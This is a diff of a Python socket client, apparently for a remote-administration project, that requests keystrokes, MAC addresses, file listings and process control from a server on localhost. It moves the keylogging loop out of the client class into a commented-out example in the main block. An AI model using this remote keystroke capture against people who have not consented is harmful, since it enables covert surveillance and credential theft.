@@ -65,15 +65,6 @@ class SocketClient:
             return self.__clean()
         except OSError:
             return self.__clean
-    
-    def __keyhook_loop(self, logger):
-        while not threading.current_thread().is_stopped():
-            with self.__lock:
-                data = self.__request('request_key')
-                if data is None:
-                    return
-                logger.info(data) # write new data to file
-            time.sleep(0.1)
             
     def disconnect(self):
         """
@@ -96,20 +87,11 @@ class SocketClient:
     def request_mac(self):
         return self.__request('request_mac')
     
-    def start_keyhook(self, filename):
-        if not self.__keylogger:
-            logger = create_file_logger(filename)
-            self.__keylogger = stoppabe_thread(target = self.__keyhook_loop, 
-                                               args=[logger], daemon = True)
-            self.__keylogger.start()
+    def request_key(self):
+        return self.__request('request_key')
             
     def stop_keyhook(self):
-        self.__lock.acquire()
-        if self.__keylogger:
-            self.__request('stop_key')
-            self.__keylogger.stop()
-            self.__keylogger = None
-        self.__lock.release()
+        return self.__request('stop_key')
         
     def logout(self):
         return self.__request("logout")
@@ -155,17 +137,30 @@ class SocketClient:
     def start_app(self, app_id):
         return self.__request("process_management", 
                        {"opcode": process_opcode.STARTAPP, "app_id": app_id})
-        
+
+from utils import stoppabe_thread
+
 if __name__ == "__main__":
     client = SocketClient()
     client.connect('127.0.0.1', 26100)
+    print(client.request_listdir(None))
     # nics = client.request_mac()
     # for nic in nics:
     #     print(nic)
-    client.start_keyhook("keylog.txt")
-    time.sleep(5)
-    client.stop_keyhook()
-        
+    # def keyhook_loop():
+    #     while not threading.current_thread().is_stopped():
+    #         data = client.request_key()
+    #         if data is None:
+    #             return
+    #         print(data) # write new data to file
+    #         time.sleep(0.1)
+    
+    # keylogger = stoppabe_thread(target=keyhook_loop, args=[], daemon=True)
+    
+    # keylogger.start()
+    # time.sleep(10)
+    # keylogger.stop()
+    # client.stop_keyhook()
     # procs = client.request_list_process()
     # for proc in procs:
     #     if proc["is_app"]:
